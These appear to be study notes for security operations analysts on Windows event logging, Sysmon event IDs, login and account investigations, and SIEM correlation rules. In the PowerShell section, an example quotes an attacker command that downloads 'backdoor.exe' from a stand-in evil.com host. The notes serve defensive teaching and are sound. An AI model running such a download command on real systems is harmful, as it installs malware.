---

## 🔍 1. What Is Logging and Why It Matters

Logs are records of system or user activity (e.g., logins, processes, file changes).

**Critical for:**

- 🧯 **Incident Response** – Reconstruct attacks
- 🔎 **Threat Hunting** – Proactively find threats
- 🚨 **Alerting** – Trigger real-time detections

---

## 🧠 2. Where Logs Come From in Windows Systems

Logs are categorized and accessed via the **Event Viewer**:

| Log Source | Examples | Location in Event Viewer |
| --- | --- | --- |
| Security | Logins, user management, processes | Windows Logs → Security |
| Application | App crashes, errors | Windows Logs → Application |
| Sysmon | Advanced process/network/file logs | Applications & Services → Microsoft → Windows → Sysmon → Operational |
| PowerShell | Cmd history (interactive shell) | `ConsoleHost_history.txt` file |

---

## ⚙️ 3. Important Event IDs to Know

| Event ID | Type | Purpose |
| --- | --- | --- |
| 4624 | Successful login | Confirm login origin (RDP, local, network) |
| 4625 | Failed login | Detect brute-force, password spraying |
| 4688 | Process creation (basic) | Track new processes (must be enabled) |
| 1 | Sysmon: Process creation | Rich info: parent, hash, command line |
| 11 | Sysmon: File creation | Detect dropped malware |
| 3 | Sysmon: Network connection | Detect outbound C2 traffic |
| 22 | Sysmon: DNS queries | Detect suspicious domain access |
| 4720 | User created | Backdoor account detection |
| 4732 | User added to group | Detect privilege escalation |

---

## 🔐 4. Investigating Login Events

### ✅ 4624 – Successful Logon

**Important Fields:**

- **Logon Type:**
    - 3 = Network logon (file share)
    - 10 = RDP
- Workstation Name
- Source IP
- Logon ID – trace full session

### ❌ 4625 – Failed Logon

**Look for:**

- Multiple failures on one account → Brute force
- Many accounts, few attempts → Password spraying
- Unusual IPs/hostnames (e.g., kali)

🧪 **Example:**

> IP 45.9.100.10 attempts logins for admin, helpdesk, guest — all fail with ID 4625, Type 10 → likely brute force via RDP.
> 

---

## 👤 5. User Account Management

Track user creation/modification events for potential attacker persistence.

| Event ID | Action | Why It Matters |
| --- | --- | --- |
| 4720 | User created | Look for rogue accounts |
| 4725 | User disabled | Could hide SOC accounts |
| 4723/4724 | Password changed/reset | Credentials hijack |
| 4732 | User added to group | Privilege escalation |

**Investigate:**

- **Subject:** Who made the change?
- **Target:** Who was changed/added?
- **Time:** After-hours changes = 🚩
- **Logon ID:** Trace to source login (4624)

🧪 **Example:**

> User svc_support created admin_backdoor and added it to Administrators at 2:15 AM.
> 

---

## 🛠 6. Process Creation (Sysmon ID 1)

Sysmon logs rich process data. Use this to detect tool use, malware, scripts.

**Key Fields:**

- `Image` – Path of executable
- `CommandLine` – Arguments passed
- `ParentImage` – What launched it?
- `Hash` – MD5/SHA256, check on VirusTotal
- `Logon ID` – Correlate to session (4624)

**🚩 Red Flags:**

1. Suspicious folder (`C:\Temp`, `Public`)
2. Random filenames (`abc123.exe`)
3. Launched by odd parent (`notepad.exe → powershell.exe`)
4. Unknown or malicious hash

🧪 **Example:**

> C:\Users\Public\svhost.exe run by cmd.exe → hash flagged on VirusTotal → likely malware dropper.
> 

---

## 🌐 7. Network, File, Registry (Sysmon)

| Event ID | Logs... | Use Case |
| --- | --- | --- |
| 3 | Network connections | External C2, data exfil |
| 22 | DNS lookups | Calls to shady domains |
| 11 | File creations | Dropped malware/scripts |
| 13 | Registry modifications | Persistence mechanisms |

**Correlate with:**

- `ProcessId` → backtrack to Sysmon ID 1
- `Logon ID` → backtrack to user (4624)

🧪 **Example:**

> powershell.exe with PID 8102 creates a.exe (ID 11), connects to 198.51.100.1:4444 (ID 3), DNS request to x.tinyurl.click (ID 22)
> 

---

## 📜 8. PowerShell Monitoring

Sysmon logs the start of PowerShell, but **not what was run**.

### ✅ Solution: PowerShell History File

**Path:**

```
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

```

**Use to see:**

- Recon: `Get-LocalUser`, `netstat`
- Downloads: `Invoke-WebRequest`
- Persistence: Scripts, registry edits

🧪 **Example:**

> History shows:
> 
> 
> `Invoke-WebRequest http://evil.com/backdoor.exe -OutFile C:\Temp\bd.exe`
> 

But Sysmon only shows `powershell.exe` ran — not what it did.

---

## 📊 9. SIEM and Event Correlation

Use SIEMs (Splunk, ELK, QRadar, etc.) to:

- Aggregate logs from multiple sources
- Set real-time alerts with correlation rules
- Create dashboards for visibility
- Query across logs for fast investigations

🧠 **Example Correlation Rules:**

| Logic | Alert Trigger |
| --- | --- |
| 5× 4625 from same IP in 10s | 🔐 Brute Force Detected |
| 4720 + 4732 within 2 min | 👑 New Admin Account |
| PowerShell from `cmd.exe` | ⚠️ Suspicious Parent Process |

---

## 🧑‍💻 10. SOC Analyst Workflow

1. **Monitor Dashboards** – Look for SIEM alerts, spikes
2. **Triage Alerts** – Confirm log source, event type
3. **Correlate Events:**
    - Use **Logon ID** → Trace session
    - Use **ProcessId** → Trace process chain
4. **Decide Action:**
    - Confirm true/false positive
    - Block IP, isolate host, escalate if needed
5. **Tune Rules** – Reduce noise, improve detections

---
